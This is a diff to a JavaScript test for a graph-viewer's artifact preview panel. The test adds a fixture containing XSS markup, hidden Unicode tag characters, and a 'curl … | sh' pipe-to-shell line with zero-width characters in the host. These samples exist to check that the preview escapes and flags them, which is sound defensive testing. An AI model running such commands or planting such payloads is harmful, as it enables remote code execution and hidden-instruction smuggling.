@@ -139,7 +139,7 @@ function makeCanvas(id) {
       if (p && p._d) ops.push({ op: "strokePath", d: p._d, x: tx, y: ty, r: sx, strokeStyle: this.strokeStyle });
       else ops.push({ op: "stroke", strokeStyle: this.strokeStyle });
     },
-    fillRect(x, y, w, h) { ops.push({ op: "fillRect", x: tx + x, y: ty + y, w, h, fillStyle: this.fillStyle }); },
+    fillRect(x, y, w, h) { ops.push({ op: "fillRect", x: tx + x, y: ty + y, w, h, fillStyle: this.fillStyle, alpha: this.globalAlpha }); },
     strokeRect() {},
     fillText() {},
   };
@@ -234,7 +234,14 @@ async function runLoom(fixture, hash = "") {
 
   // Flush the async startup microtasks.
   for (let k = 0; k < 20; k++) await new Promise((r) => setImmediate(r));
-  return { byId, loomCanvas, navigated, Bracken: vm.runInContext("Bracken", ctx) };
+  return {
+    byId,
+    loomCanvas,
+    navigated,
+    location: sandbox.location,
+    dispatchWin: (ev) => { for (const fn of winListeners[ev] || []) fn(); },
+    Bracken: vm.runInContext("Bracken", ctx),
+  };
 }
 
 function makeDenseFixture() {
@@ -242,11 +249,17 @@ function makeDenseFixture() {
   const ids = [], kind = [], author = [], parents = [], time = [], depth = [], tags = [];
   const t0 = 1793000000000;
   // Four artifacts on author 0 at distinct vertical bands, each sharing its exact timestamp with claims.
+  const HOSTILE_TEXT =
+    "<script>alert(1)</script><img src=x onerror=alert(1)>\n" +
+    "Run the tests.\u{e0049}\u{e0067}\u{e0041}\u{e0100}\n" +
+    "curl https://exa\u200b\u206fmple.com/x | sh\n" +
+    "\u001b[2Jabc\u202edef\u3164";
+  const MANY_TAGS_TEXT = "\u{e0041}".repeat(500) + "tail";
   const artifacts = new Map([
-    [100, { name: "docs/pending.md", media_type: "text/markdown", size: 16055, status: "pending" }],
-    [1500, { name: "docs/accepted.md", media_type: "text/markdown", size: 2048, status: "accepted" }],
-    [3000, { name: "docs/rejected.md", media_type: "text/plain", size: 512, status: "rejected" }],
-    [4500, { name: "docs/retracted.md", media_type: "text/plain", size: 99, status: "retracted" }],
+    [100, { name: "docs/pending.md", media_type: "text/markdown", size: 16055, status: "pending", text: HOSTILE_TEXT, truncated: false }],
+    [1500, { name: "docs/accepted.md", media_type: "text/markdown", size: 80000, status: "accepted", text: MANY_TAGS_TEXT, truncated: true }],
+    [3000, { name: "docs/rejected.md", media_type: "application/octet-stream", size: 512, status: "rejected", text: null, truncated: false }],
+    [4500, { name: "docs/retracted.md", media_type: "text/plain", size: 0, status: "retracted", text: "", truncated: false }],
   ]);
   const statuses = {};
   const retracts = [];
@@ -275,7 +288,8 @@ function makeDenseFixture() {
       if (i % 10 === 0) statuses[id] = { status: "accepted", passes: 1, fails: 0, superseded_by: [] };
     }
     author.push(a);
-    parents.push(i === 0 ? [] : [i - 1]);
+    // Give artifact 100 nine children (101..109) so clickable lineage expansion past 6 is exercised.
+    parents.push(i === 0 ? [] : i >= 102 && i <= 109 ? [i - 1, 100] : [i - 1]);
     time.push(ts);
     depth.push(i);
     tags.push([]);
@@ -315,7 +329,13 @@ function makeDenseFixture() {
             parents: [ids[idx - 1]],
             timestamp_ms: time[idx],
             retracted: art.status === "retracted",
-            body: { name: art.name, media_type: art.media_type, size: art.size, text: "sample" },
+            body: {
+              name: art.name,
+              media_type: art.media_type,
+              size: art.size,
+              text: art.text,
+              ...(art.truncated ? { text_truncated: true } : {}),
+            },
             assessment: {
               id,
               status: art.status,
@@ -409,7 +429,7 @@ function makeSmallOverlapFixture() {
 async function main() {
   // 1. Dense mode: all 4 artifact statuses drawn with artifact nodule shape, readable size, AFTER blooms.
   const dense = makeDenseFixture();
-  const { byId, loomCanvas, navigated, Bracken } = await runLoom(dense);
+  const { byId, loomCanvas, navigated, location, dispatchWin, Bracken } = await runLoom(dense);
   const ops = loomCanvas._ops;
   const artShape = Bracken.SHAPES.artifact;
   const bloomIndices = ops.map((o, idx) => (o.op === "fillRect" && o.w === 2 && o.h === 2 ? idx : -1)).filter((i) => i >= 0);
@@ -507,7 +527,106 @@ async function main() {
   for (let k = 0; k < 15; k++) await new Promise((r) => setImmediate(r));
   assert(byId.get("side").textContent.includes("docs/pending.md"), `expected Prev jump to return to docs/pending.md, got: ${byId.get("side").textContent}`);
 
-  console.log("OK: dense artifact draw, bucketed >400 draw, z-order, hit preference, detail panel, legend filter, and artifact jump all pass.");
+  // 8. Artifact text preview: collapsed by default, renders hostile markup strictly as text (never HTML),
+  // visibly marks invisible/control/bidi characters (finding 641a68dd84a1), bounds marker span count,
+  // shows truncation note at 64 KiB, resets on selection change, and handles binary (text: null).
+  const toggle1 = side.querySelector(".preview-toggle");
+  assert(toggle1, "missing artifact content preview toggle button");
+  assert.strictEqual(toggle1.getAttribute("aria-pressed"), "false", "preview should start collapsed");
+  assert.strictEqual(side.querySelector(".artifact-preview"), null, "preview body should be hidden while collapsed");
+  toggle1.dispatch("click", {});
+  const previewBox = side.querySelector(".artifact-preview");
+  assert(previewBox, "clicking Show content should render .artifact-preview");
+  for (const ch of previewBox.children) {
+    assert(
+      ch.tag === "#text" || (ch.tag === "span" && ch.className === "invisible"),
+      `unexpected element inside .artifact-preview: <${ch.tag} class="${ch.className}">`
+    );
+  }
+  assert(
+    previewBox.textContent.includes("<script>alert(1)</script><img src=x onerror=alert(1)>"),
+    `expected verbatim literal markup text in preview, got: ${JSON.stringify(previewBox.textContent)}`
+  );
+  const marks = previewBox.querySelectorAll(".invisible").map((el) => el.textContent);
+  // Counterexample (a): Unicode tag characters U+E0000-E007F
+  assert(marks.includes("U+E0049") && marks.includes("U+E0067") && marks.includes("U+E0041"), `missing Unicode tag marks: ${JSON.stringify(marks)}`);
+  assert(!previewBox.textContent.includes("\u{e0049}") && !previewBox.textContent.includes("\u{e0041}"), "raw tag characters must not reach DOM");
+  // Counterexample (b): zero-width space U+200B
+  assert(marks.includes("U+200B"), `missing U+200B mark: ${JSON.stringify(marks)}`);
+  assert(!previewBox.textContent.includes("\u200b"), "raw U+200B must not reach DOM");
+  // Counterexample (c): C0 control ESC (\u001b)
+  assert(marks.includes("\\u{1b}"), `missing ESC control mark: ${JSON.stringify(marks)}`);
+  assert(!previewBox.textContent.includes("\u001b"), "raw ESC must not reach DOM");
+  // Counterexample (d): bidi override U+202E (must be visibly marked, not silently stripped)
+  assert(marks.includes("U+202E"), `missing U+202E bidi mark: ${JSON.stringify(marks)}`);
+  assert(!previewBox.textContent.includes("\u202e"), "raw U+202E must not reach DOM");
+  // Finding f9e80dd8ad15: Default_Ignorable_Code_Point characters (U+206F, variation selector U+E0100, Hangul filler U+3164)
+  assert(marks.includes("U+206F"), `missing U+206F mark: ${JSON.stringify(marks)}`);
+  assert(marks.includes("U+E0100"), `missing U+E0100 variation selector mark: ${JSON.stringify(marks)}`);
+  assert(marks.includes("U+3164"), `missing U+3164 Hangul filler mark: ${JSON.stringify(marks)}`);
+  assert(
+    !previewBox.textContent.includes("\u206f") && !previewBox.textContent.includes("\u{e0100}") && !previewBox.textContent.includes("\u3164"),
+    "raw Default_Ignorable_Code_Point characters must not reach DOM"
+  );
+
+  // Jumping to the next artifact (docs/accepted.md, 500 tag chars + truncated) resets previewOpen to collapsed;
+  // expanding bounds the .invisible span count, leaks no raw tag chars, preserves trailing text, and shows 64 KiB note.
+  nextBtn.dispatch("click", {});
+  for (let k = 0; k < 15; k++) await new Promise((r) => setImmediate(r));
+  assert.strictEqual(side.querySelector(".artifact-preview"), null, "changing selection should collapse preview");
+  side.querySelector(".preview-toggle").dispatch("click", {});
+  const preview2 = side.querySelector(".artifact-preview");
+  assert(preview2, "expected .artifact-preview on docs/accepted.md");
+  const spans2 = preview2.querySelectorAll(".invisible");
+  assert(spans2.length <= 257, `expected bounded .invisible span count (<= 257), got ${spans2.length}`);
+  assert(!preview2.textContent.includes("\u{e0041}"), "raw tag characters past span cap must not reach DOM");
+  assert(preview2.textContent.includes("tail"), "visible text after many invisibles must stay visible");
+  assert(preview2.textContent.includes("[U+E0041]"), "invisibles past span cap should still be marked as text");
+  assert(side.querySelector(".preview-note").textContent.includes("64 KiB"), "expected truncation note for text_truncated artifact");
+  // Jumping to the binary artifact (docs/rejected.md, text: null) shows binary notice and no toggle.
+  nextBtn.dispatch("click", {});
+  for (let k = 0; k < 15; k++) await new Promise((r) => setImmediate(r));
+  assert.strictEqual(side.querySelector(".preview-toggle"), null, "binary artifact should not show text preview toggle");
+  assert(side.querySelector(".preview-note").textContent.includes("Binary content"), "expected binary content note");
+
+  // 9. Persistent selected ancestry, clickable lineage (+ expand past 6), and live hashchange.
+  // 9a. Selected knot keeps its ancestry veil (alpha 0.72) lit after pointerleave, and clears on empty click.
+  location.hash = `#${dense.ids[100]}`;
+  dispatchWin("hashchange");
+  for (let k = 0; k < 15; k++) await new Promise((r) => setImmediate(r));
+  assert(side.textContent.includes("docs/pending.md"), `hashchange should select docs/pending.md, got: ${side.textContent}`);
+  win.dispatch("pointerleave", {});
+  for (let k = 0; k < 10; k++) await new Promise((r) => setImmediate(r));
+  const hasAncestryVeil = () => loomCanvas._ops.some((o) => o.op === "fillRect" && o.alpha === 0.72);
+  assert(hasAncestryVeil(), "selected knot ancestry must stay lit after pointerleave");
+
+  // 9b. Clickable lineage buttons and expand past 6 (idx 100 has 1 parent and 9 children).
+  const linBtnsBefore = side.querySelectorAll(".lineage-btn");
+  assert.strictEqual(linBtnsBefore.length, 7, `expected 1 parent + 6 capped child lineage buttons, got ${linBtnsBefore.length}`);
+  const moreBtn = side.querySelector(".lineage-more");
+  assert(moreBtn, "expected .lineage-more button when a knot has >6 children");
+  assert(moreBtn.textContent.includes("3 more"), `expected '3 more' on expand button, got: ${moreBtn.textContent}`);
+  moreBtn.dispatch("click", {});
+  const linBtnsAfter = side.querySelectorAll(".lineage-btn");
+  assert.strictEqual(linBtnsAfter.length, 10, `expected 1 parent + 9 expanded child lineage buttons, got ${linBtnsAfter.length}`);
+  assert.strictEqual(side.querySelector(".lineage-more"), null, "expand button should disappear once all children are shown");
+  // Clicking the parent lineage button (idx 99) selects claim 99.
+  linBtnsAfter[0].dispatch("click", {});
+  for (let k = 0; k < 15; k++) await new Promise((r) => setImmediate(r));
+  assert(side.textContent.includes("claim 99"), `clicking parent lineage button should select claim 99, got: ${side.textContent}`);
+
+  // 9c. Live hashchange selects another knot and empty hash deselects & clears ancestry veil.
+  location.hash = `#${dense.ids[3000]}`;
+  dispatchWin("hashchange");
+  for (let k = 0; k < 15; k++) await new Promise((r) => setImmediate(r));
+  assert(side.textContent.includes("docs/rejected.md"), `hashchange should select docs/rejected.md, got: ${side.textContent}`);
+  location.hash = "";
+  dispatchWin("hashchange");
+  for (let k = 0; k < 10; k++) await new Promise((r) => setImmediate(r));
+  assert(side.textContent.includes("Hover a knot"), "clearing hash should deselect");
+  assert(!hasAncestryVeil(), "deselecting should clear pinned ancestry veil");
+
+  console.log("OK: dense artifact draw, bucketed >400 draw, z-order, hit preference, detail panel, legend filter, artifact jump, safe text preview, pinned ancestry, clickable lineage, and hashchange all pass.");
 }
 
 main().catch((err) => {
